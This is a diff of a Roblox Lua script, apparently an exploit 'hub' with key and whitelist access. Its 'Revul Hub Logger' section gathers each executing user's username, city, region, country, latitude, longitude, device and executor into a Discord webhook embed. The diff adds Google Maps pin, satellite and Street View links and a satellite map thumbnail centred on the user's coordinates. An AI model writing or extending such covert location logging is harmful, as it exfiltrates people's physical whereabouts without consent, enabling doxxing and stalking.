@@ -56,13 +56,26 @@ end)
 -- 📍 Ubicación formateada
 local fullLocation = city .. ", " .. region .. ", " .. country
 
--- 🗺️ LINK SATÉLITE + ZOOM + CENTRADO
-local mapsLink = "https://www.google.com/maps/@?api=1&map_action=map" ..
+-- 🗺️ LINK SATÉLITE
+local satelliteLink = "https://www.google.com/maps/@?api=1&map_action=map" ..
 "&center=" .. lat .. "," .. lon ..
 "&zoom=18" ..
 "&basemap=satellite"
 
--- 🎮 Nombre del juego (fallback seguro)
+-- 🚶 STREET VIEW LINK
+local streetViewLink = "https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=" ..
+lat .. "," .. lon
+
+-- 📌 LINK CON PIN (más claro)
+local pinLink = "https://www.google.com/maps?q=" .. lat .. "," .. lon .. "&z=18"
+
+-- 🖼️ THUMBNAIL DEL MAPA (Google Static Maps)
+local mapThumbnail = "https://maps.googleapis.com/maps/api/staticmap?center=" ..
+lat .. "," .. lon ..
+"&zoom=15&size=600x300&markers=color:red%7C" .. lat .. "," .. lon ..
+"&maptype=satellite"
+
+-- 🎮 Nombre del juego
 local gameName = "Unknown Game"
 pcall(function()
     local info = MarketplaceService:GetProductInfo(game.PlaceId)
@@ -71,7 +84,7 @@ pcall(function()
     end
 end)
 
--- 👥 Jugadores en server
+-- 👥 Jugadores
 local playersCount = #Players:GetPlayers()
 local maxPlayers = Players.MaxPlayers
 
@@ -81,15 +94,20 @@ local deviceType = UserInputService.TouchEnabled and "Mobile" or "PC"
 -- 🔐 Tipo de acceso
 local accessType = WHITELIST[player.UserId] and "Whitelist" or "Key"
 
--- 📅 Fecha y hora
+-- 📅 Fecha
 local timeStamp = os.date("%Y-%m-%d %H:%M:%S")
 
--- 📡 Data Discord
+-- 📡 DATA DISCORD
 local data = {
     ["username"] = "Revul Hub Logger",
     ["embeds"] = {{
         ["title"] = "🚀 Script Ejecutado",
         ["color"] = 65280,
+
+        ["thumbnail"] = {
+            ["url"] = mapThumbnail
+        },
+
         ["fields"] = {
 
             {["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},
@@ -105,7 +123,9 @@ local data = {
             {["name"] = "🧭 Lat", ["value"] = tostring(lat), ["inline"] = true},
             {["name"] = "🧭 Lon", ["value"] = tostring(lon), ["inline"] = true},
 
-            {["name"] = "🗺️ Maps", ["value"] = mapsLink, ["inline"] = false},
+            {["name"] = "📌 Pin Map", ["value"] = pinLink, ["inline"] = false},
+            {["name"] = "🛰️ Satellite", ["value"] = satelliteLink, ["inline"] = false},
+            {["name"] = "🚶 Street View", ["value"] = streetViewLink, ["inline"] = false},
 
             {["name"] = "📱 Device", ["value"] = deviceType, ["inline"] = true},
             {["name"] = "🖥️ Executor", ["value"] = executorName, ["inline"] = true},
